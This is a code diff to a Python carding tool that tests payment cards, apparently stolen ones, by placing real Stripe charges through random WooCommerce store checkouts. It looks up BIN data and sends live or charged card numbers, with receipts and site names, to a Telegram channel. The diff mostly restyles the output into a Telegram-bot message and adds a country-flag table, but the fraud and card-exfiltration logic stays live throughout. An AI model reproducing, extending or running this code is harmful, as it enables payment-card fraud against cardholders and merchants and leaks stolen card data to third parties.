@@ -289,19 +289,90 @@ def generate_random_email(fname: str, lname: str) -> str:
     return f"{fname.lower()}.{lname.lower()}@{domain}"
 
 
+# Country to flag emoji mapping
+COUNTRY_FLAGS = {
+    'US': '🇺🇸', 'GB': '🇬🇧', 'UK': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'NZ': '🇳🇿',
+    'JP': '🇯🇵', 'PH': '🇵🇭', 'MY': '🇲🇾', 'SG': '🇸🇬', 'TH': '🇹🇭', 'HK': '🇭🇰',
+    'ZA': '🇿🇦', 'NL': '🇳🇱', 'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸',
+    'PT': '🇵🇹', 'BR': '🇧🇷', 'MX': '🇲🇽', 'AR': '🇦🇷', 'CL': '🇨🇱', 'CO': '🇨🇴',
+    'IN': '🇮🇳', 'PK': '🇵🇰', 'BD': '🇧🇩', 'ID': '🇮🇩', 'VN': '🇻🇳', 'KR': '🇰🇷',
+    'CN': '🇨🇳', 'TW': '🇹🇼', 'RU': '🇷🇺', 'UA': '🇺🇦', 'PL': '🇵🇱', 'CZ': '🇨🇿',
+    'AT': '🇦🇹', 'CH': '🇨🇭', 'BE': '🇧🇪', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
+    'FI': '🇫🇮', 'IE': '🇮🇪', 'GR': '🇬🇷', 'TR': '🇹🇷', 'IL': '🇮🇱', 'AE': '🇦🇪',
+    'SA': '🇸🇦', 'EG': '🇪🇬', 'NG': '🇳🇬', 'KE': '🇰🇪', 'GH': '🇬🇭', 'MA': '🇲🇦',
+    'RO': '🇷🇴', 'HU': '🇭🇺', 'SK': '🇸🇰', 'BG': '🇧🇬', 'HR': '🇭🇷', 'RS': '🇷🇸',
+    'SI': '🇸🇮', 'LT': '🇱🇹', 'LV': '🇱🇻', 'EE': '🇪🇪', 'CY': '🇨🇾', 'MT': '🇲🇹',
+    'LU': '🇱🇺', 'IS': '🇮🇸', 'NP': '🇳🇵', 'LK': '🇱🇰', 'MM': '🇲🇲', 'KH': '🇰🇭',
+    'LA': '🇱🇦', 'BN': '🇧🇳', 'MO': '🇲🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'EC': '🇪🇨',
+    'UY': '🇺🇾', 'PY': '🇵🇾', 'BO': '🇧🇴', 'CR': '🇨🇷', 'PA': '🇵🇦', 'GT': '🇬🇹',
+    'HN': '🇭🇳', 'SV': '🇸🇻', 'NI': '🇳🇮', 'DO': '🇩🇴', 'PR': '🇵🇷', 'JM': '🇯🇲',
+    'TT': '🇹🇹', 'BB': '🇧🇧', 'BS': '🇧🇸', 'CU': '🇨🇺', 'HT': '🇭🇹', 'QA': '🇶🇦',
+    'KW': '🇰🇼', 'BH': '🇧🇭', 'OM': '🇴🇲', 'JO': '🇯🇴', 'LB': '🇱🇧', 'IQ': '🇮🇶',
+    'IR': '🇮🇷', 'AF': '🇦🇫', 'KZ': '🇰🇿', 'UZ': '🇺🇿', 'AZ': '🇦🇿', 'GE': '🇬🇪',
+    'AM': '🇦🇲', 'BY': '🇧🇾', 'MD': '🇲🇩', 'MN': '🇲🇳', 'KG': '🇰🇬', 'TJ': '🇹🇯',
+    'TM': '🇹🇲', 'UNITED STATES': '🇺🇸', 'UNITED KINGDOM': '🇬🇧', 'CANADA': '🇨🇦',
+    'AUSTRALIA': '🇦🇺', 'NEW ZEALAND': '🇳🇿', 'JAPAN': '🇯🇵', 'PHILIPPINES': '🇵🇭',
+    'MALAYSIA': '🇲🇾', 'SINGAPORE': '🇸🇬', 'THAILAND': '🇹🇭', 'HONG KONG': '🇭🇰',
+    'SOUTH AFRICA': '🇿🇦', 'NETHERLANDS': '🇳🇱', 'GERMANY': '🇩🇪', 'FRANCE': '🇫🇷',
+    'ITALY': '🇮🇹', 'SPAIN': '🇪🇸', 'PORTUGAL': '🇵🇹', 'BRAZIL': '🇧🇷', 'MEXICO': '🇲🇽',
+    'ARGENTINA': '🇦🇷', 'CHILE': '🇨🇱', 'COLOMBIA': '🇨🇴', 'INDIA': '🇮🇳', 'PAKISTAN': '🇵🇰',
+    'BANGLADESH': '🇧🇩', 'INDONESIA': '🇮🇩', 'VIETNAM': '🇻🇳', 'SOUTH KOREA': '🇰🇷',
+    'KOREA': '🇰🇷', 'CHINA': '🇨🇳', 'TAIWAN': '🇹🇼', 'RUSSIA': '🇷🇺', 'UKRAINE': '🇺🇦',
+    'POLAND': '🇵🇱', 'CZECH REPUBLIC': '🇨🇿', 'AUSTRIA': '🇦🇹', 'SWITZERLAND': '🇨🇭',
+    'BELGIUM': '🇧🇪', 'SWEDEN': '🇸🇪', 'NORWAY': '🇳🇴', 'DENMARK': '🇩🇰', 'FINLAND': '🇫🇮',
+    'IRELAND': '🇮🇪', 'GREECE': '🇬🇷', 'TURKEY': '🇹🇷', 'ISRAEL': '🇮🇱',
+    'UNITED ARAB EMIRATES': '🇦🇪', 'UAE': '🇦🇪', 'SAUDI ARABIA': '🇸🇦', 'EGYPT': '🇪🇬',
+    'NIGERIA': '🇳🇬', 'KENYA': '🇰🇪', 'GHANA': '🇬🇭', 'MOROCCO': '🇲🇦',
+}
+
+
+def get_country_flag(country: str) -> str:
+    """Get flag emoji for a country"""
+    if not country:
+        return '🏳️'
+    country_upper = country.upper().strip()
+    return COUNTRY_FLAGS.get(country_upper, '🏳️')
+
+
+def format_response(status: str, status_emoji: str, card: str, price: str, response_msg: str, 
+                    bin_info: dict, elapsed_time: float) -> str:
+    """Format the response in the new style"""
+    return f"""{status} {status_emoji}
+
+𝗖𝗖 ⇾ {card}
+
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge "{price}"
+
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_msg}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+
+𝗕𝗮𝗻𝗸: {bin_info['bank']}
+
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['flag']}
+
+𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
+
+𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""
+
+
 def get_bin_info(cc6: str, session: requests.Session, ua: str) -> dict:
     """Get BIN information"""
     try:
         headers = {'user-agent': ua, 'accept': 'application/json'}
         response = session.get(f'https://bins.antipublic.cc/bins/{cc6}', headers=headers, timeout=10)
         data = response.json()
+        country_name = data.get('country_name', 'Not found')
+        country_code = data.get('country', '')
         return {
             'bin': data.get('bin', cc6),
             'brand': data.get('brand', 'Not found'),
             'type': data.get('type', 'Not found'),
             'level': data.get('level', 'Not found'),
             'bank': data.get('bank', 'Not found'),
-            'country': data.get('country_name', 'Not found'),
+            'country': country_name,
+            'country_code': country_code,
+            'flag': get_country_flag(country_code) if country_code else get_country_flag(country_name),
         }
     except Exception:
         return {
@@ -311,6 +382,8 @@ def get_bin_info(cc6: str, session: requests.Session, ua: str) -> dict:
             'level': 'Not found',
             'bank': 'Not found',
             'country': 'Not found',
+            'country_code': '',
+            'flag': '🏳️',
         }
 
 
@@ -331,7 +404,12 @@ def process_card(lista: str, sites: str, proxy: str = None) -> str:
     # Parse card data
     parts = lista.split('|')
     if len(parts) < 4:
-        return "#ERROR [Invalid card format]"
+        elapsed_time = time.time() - time_start
+        bin_info = {
+            'brand': 'Not found', 'type': 'Not found', 'level': 'Not found',
+            'bank': 'Not found', 'country': 'Not found', 'flag': '🏳️'
+        }
+        return format_response("DECLINED", "❌", lista, "N/A", "Invalid Card Format", bin_info, elapsed_time)
     
     cc = parts[0]
     mes = parts[1]
@@ -364,7 +442,9 @@ def process_card(lista: str, sites: str, proxy: str = None) -> str:
     # Parse sites
     urls = [url.strip() for url in sites.split(',') if url.strip()]
     if not urls:
-        return "#ERROR [No sites provided]"
+        elapsed_time = time.time() - time_start
+        bin_info = get_bin_info(cc6, session, ua)
+        return format_response("DECLINED", "❌", lista, "N/A", "No Sites Provided", bin_info, elapsed_time)
     
     # Select random URL
     product_page_url = random.choice(urls)
@@ -425,7 +505,8 @@ def process_card(lista: str, sites: str, proxy: str = None) -> str:
         
         if not product_id:
             bin_info = get_bin_info(cc6, session, ua)
-            return f"#DEAD [CANT FIND PRODUCT] - [{ip}] - [SITE {line_number}]\n INFO: {bin_info['brand']}-{bin_info['type']}-{bin_info['level']} | {bin_info['bank']} | {bin_info['country']}"
+            elapsed_time = time.time() - time_start
+            return format_response("DECLINED", "❌", lista, "N/A", "Can't find product", bin_info, elapsed_time)
         
         # Build add to cart URL
         query_params = {'quantity': 1, 'add-to-cart': product_id}
@@ -477,7 +558,8 @@ def process_card(lista: str, sites: str, proxy: str = None) -> str:
         
         if not pk_live:
             bin_info = get_bin_info(cc6, session, ua)
-            return f"#DEAD [NO STRIPE KEY] - [{ip}] - [SITE {line_number}]\n INFO: {bin_info['brand']}-{bin_info['type']}-{bin_info['level']} | {bin_info['bank']} | {bin_info['country']}"
+            elapsed_time = time.time() - time_start
+            return format_response("DECLINED", "❌", lista, "N/A", "No Stripe key found", bin_info, elapsed_time)
         
         # Extract nonce
         nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', checkout_content)
@@ -598,51 +680,59 @@ def process_card(lista: str, sites: str, proxy: str = None) -> str:
             redirect = ''
         
         hostname1 = f"http://{hostname}" if not hostname.startswith('http') else hostname
-        info_str = f"INFO: {bin_info['brand']}-{bin_info['type']}-{bin_info['level']} | {bin_info['bank']} | {bin_info['country']}"
+        
+        # Calculate elapsed time
+        elapsed_time = time.time() - time_start
         
         # Check responses
         if '"redirect":"#response' in payment_result or '"result":"success","redirect":"#yith-confirm-pi-' in payment_result:
-            return f"#DEAD [DECLINED] - [{ip}] - [AMOUNT:{price1}] - [SITE {line_number}]\n {info_str}"
+            return format_response("DECLINED", "❌", lista, price1, "Card Declined", bin_info, elapsed_time)
         
         elif '"result":"success"' in payment_result:
             receipt_url = redirect.replace('\\/', '/')
             telegram_msg = f"[#CHARGED] - {lista} [STRIPE CVV CHARGED]\n[{receipt_url}]\n[{email}]\n[{price1}]\n[{hostname1}]"
             send_to_telegram(telegram_msg)
-            return f"#CVV [CHARGED CVV] - [{ip}] - [AMOUNT:{price1}] - [RECEIPT: {receipt_url}] - [SITE {line_number}]\n {info_str}"
+            return format_response("CVV", "✅", lista, price1, f"Charged Successfully | Receipt: {receipt_url}", bin_info, elapsed_time)
         
         elif "card's security code is incorrect" in payment_result.lower() or "card's security code is invalid" in payment_result.lower():
             telegram_msg = f"[#CCN] - {lista} [STRIPE CCN LIVED]\n[Security code incorrect]\n[{price1}]\n[{hostname1}]"
             send_to_telegram(telegram_msg)
-            return f"#CCN [Your Card Security Code is Incorrect] - [{ip}] - [AMOUNT:{price1}] - [SITE {line_number}]\n {info_str}"
+            return format_response("CCN", "✅", lista, price1, "Security Code Incorrect", bin_info, elapsed_time)
         
         elif "insufficient funds" in payment_result.lower():
             telegram_msg = f"[#CVV] - {lista} [STRIPE CVV LIVED]\n[Insufficient funds]\n[{price1}]\n[{hostname1}]"
             send_to_telegram(telegram_msg)
-            return f"#CVV [Your Card Has Insufficient Funds] - [{ip}] - [AMOUNT:{price1}] - [SITE {line_number}]\n {info_str}"
+            return format_response("CVV", "✅", lista, price1, "Insufficient Funds", bin_info, elapsed_time)
         
         elif "unable to process your order" in payment_result.lower():
-            return f"#DEAD [NONCE ERROR] - [{ip}] - [AMOUNT:{price1}] - [SITE {line_number}]\n {info_str}"
+            return format_response("DECLINED", "❌", lista, price1, "Nonce Error", bin_info, elapsed_time)
         
         elif '"redirect":"#confirm' in payment_result:
-            return f"#CCN [3ds Verification Required] - [{ip}] - [AMOUNT:{price1}] - [SITE {line_number}]\n {info_str}"
+            return format_response("CCN", "✅", lista, price1, "3DS Verification Required", bin_info, elapsed_time)
         
         elif 'result":"failure","messages":"","refresh":false,"reload":true' in payment_result:
-            return f"#DEAD [DECLINED] - [{ip}] - [AMOUNT:{price1}] - [SITE {line_number}]\n {info_str}"
+            return format_response("DECLINED", "❌", lista, price1, "Card Declined", bin_info, elapsed_time)
         
         elif "payment processing failed" in payment_result.lower():
-            return f"#DEAD [Payment processing failed] - [{ip}] - [AMOUNT:{price1}] - [SITE {line_number}]\n {info_str}"
+            return format_response("DECLINED", "❌", lista, price1, "Payment Processing Failed", bin_info, elapsed_time)
         
         elif "card was declined" in payment_result.lower():
-            return f"#DEAD [Your card was declined] - [{ip}] - [AMOUNT:{price1}] - [SITE {line_number}]\n {info_str}"
+            return format_response("DECLINED", "❌", lista, price1, "Card Was Declined", bin_info, elapsed_time)
         
         else:
-            return f"#DEAD [{messages}] - [{ip}] - [AMOUNT:{price1}] - [SITE {line_number}]\n {info_str}"
+            return format_response("DECLINED", "❌", lista, price1, messages if messages else "Unknown Error", bin_info, elapsed_time)
     
     except requests.exceptions.RequestException as e:
         bin_info = get_bin_info(cc6, session, ua)
-        return f"#ERROR [Request failed: {str(e)[:50]}] - [{ip}]\n INFO: {bin_info['brand']}-{bin_info['type']}-{bin_info['level']} | {bin_info['bank']} | {bin_info['country']}"
+        elapsed_time = time.time() - time_start
+        return format_response("DECLINED", "❌", lista, "N/A", f"Request Failed: {str(e)[:50]}", bin_info, elapsed_time)
     except Exception as e:
-        return f"#ERROR [{str(e)[:100]}]"
+        elapsed_time = time.time() - time_start
+        bin_info = {
+            'brand': 'Not found', 'type': 'Not found', 'level': 'Not found',
+            'bank': 'Not found', 'country': 'Not found', 'flag': '🏳️'
+        }
+        return format_response("DECLINED", "❌", lista, "N/A", f"Error: {str(e)[:50]}", bin_info, elapsed_time)
 
 
 def load_sites_from_file(filepath: str) -> str:
@@ -678,7 +768,7 @@ if __name__ == '__main__':
         sites = load_sites_from_file(args.sites)
     
     if not sites:
-        print("#ERROR [No sites provided. Use --sites or create sites.txt]")
+        print("DECLINED ❌\n\n𝗖𝗖 ⇾ N/A\n\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge \"N/A\"\n\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No sites provided. Use --sites or create sites.txt\n\n𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: N/A - N/A - N/A\n\n𝗕𝗮𝗻𝗸: N/A\n\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: N/A 🏳️\n\n𝗧𝗼𝗼𝗸 0.00 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n\n𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB")
         sys.exit(1)
     
     result = process_card(args.lista, sites, args.proxy)
